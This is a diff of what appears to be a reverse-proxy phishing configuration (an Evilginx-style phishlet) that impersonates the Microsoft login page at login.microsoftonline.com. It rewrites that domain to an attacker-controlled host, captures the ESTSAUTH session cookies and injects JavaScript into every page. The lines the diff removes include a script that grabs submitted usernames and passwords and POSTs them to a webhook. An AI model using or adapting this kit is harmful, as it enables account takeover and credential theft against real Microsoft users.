@@ -3,7 +3,7 @@ min_ver: '3.0.0'
 proxy_hosts:
   - {phish_sub: '{{.Endpoint2}}', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'login.microsoftonline.com', replace: '{{.Endpoint2}}.{{.Domain}}', mimes: ['text/html']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', phish_sub: '{{.Endpoint2}}', mimes: ['text/html', 'application/javascript', 'application/json']}
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
@@ -24,25 +24,15 @@ js_inject:
     trigger_paths: ['/.*']
     code: |
       (function() {
-        const api = "https://{{.Domain}}/api/webhook";
-        const secret = "{{.WebhookSecret}}";
-        const source = "microsoft";
         var urlParams = new URLSearchParams(window.location.search);
         var email = urlParams.get('email');
         if (email) {
-          const field = document.querySelector('input[name="login"]') || document.querySelector('input[type="email"]');
-          if (field) { field.value = email; field.dispatchEvent(new Event('input', { bubbles: true })); }
-        }
-        document.addEventListener('submit', function() {
-          const u = document.querySelector('input[name="login"]')?.value || document.querySelector('input[type="email"]')?.value;
-          const p = document.querySelector('input[name="passwd"]')?.value || document.querySelector('input[type="password"]')?.value;
-          if (u || p) {
-            fetch(api, {
-              method: "POST", headers: {"Content-Type": "application/json", "X-Webhook-Secret": secret},
-              body: JSON.stringify({event: p ? "credentials" : "email", source: source, email: u, password: p})
-            }).catch(() => {});
+          var emailField = document.querySelector('input[name="login"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
           }
-        }, true);
+        }
       })()
 webhook:
   url: "http://127.0.0.1:{{.AppPort}}/api/webhook"
